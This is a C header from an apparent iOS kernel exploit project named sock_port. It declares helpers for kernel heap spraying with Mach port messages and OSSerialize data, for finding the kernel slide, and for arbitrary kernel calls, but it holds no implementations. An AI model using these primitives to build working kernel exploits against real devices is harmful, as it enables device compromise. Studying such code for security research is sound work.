//
//  exploit_utilities.h
//  sock_port
//
//  Created by Jake James on 7/17/19.
//  Copyright Â© 2019 Jake James. All rights reserved.
//

#ifndef exploit_utilities_h
#define exploit_utilities_h

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <errno.h>
#include <mach/mach.h>
#include <sched.h>
#include <IOKit/IOKitLib.h>
#include <sys/utsname.h>
#include "kernel_memory.h"
#include "patchfinder64.h"

#define MH_MAGIC_64    0xfeedfacf
#define ADDR "0x%016llx"
#define KERNEL_BASE_ADDRESS (0xFFFFFF8002002000) /* iOS 8 */
typedef uint64_t addr_t;

typedef mach_port_t io_master_t;
extern kern_return_t host_get_io_master(host_t      host,
                                        io_master_t *io_master);

struct ool_msg  {
    mach_msg_header_t hdr;
    mach_msg_body_t body;
    mach_msg_ool_ports_descriptor_t ool_ports;
};

struct simple_msg {
    mach_msg_header_t hdr;
    char buf[0];
};

size_t message_size_for_kalloc_size(size_t kalloc_size);
mach_port_t fill_kalloc_with_port_pointer(mach_port_t target_port, int count, int disposition);
mach_port_t send_kalloc_message(uint8_t *replacer_message_body, uint32_t replacer_body_size);

enum {
    kIOCFSerializeToBinary          = 0x00000001U,
};

#define kOSSerializeBinarySignature 0x000000D3U

enum {
    kOSSerializeDictionary          = 0x01000000U,
    kOSSerializeArray               = 0x02000000U,
    kOSSerializeSet                 = 0x03000000U,
    kOSSerializeNumber              = 0x04000000U,
    kOSSerializeSymbol              = 0x08000000U,
    kOSSerializeString              = 0x09000000U,
    kOSSerializeData                = 0x0a000000U,
    kOSSerializeBoolean             = 0x0b000000U,
    kOSSerializeObject              = 0x0c000000U,
    
    kOSSerializeTypeMask            = 0x7F000000U,
    kOSSerializeDataMask            = 0x00FFFFFFU,
    
    kOSSerializeEndCollection       = 0x80000000U,
    
    kOSSerializeMagic               = 0x000000d3U,
};

extern mach_vm_size_t pagesize;

void spray_OSSerialize(void* data, size_t size);
io_connect_t _io_spawn_client(void *dict, size_t dictlen);
kern_return_t get_kernel_anchor(size_t*);
uint64_t get_kernel_slide(void);
void init_kcall(uint64_t our_task_addr);
uint64_t kcall(uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3, uint64_t x4, uint64_t x5, uint64_t x6);
#endif /* exploit_utilities_h */
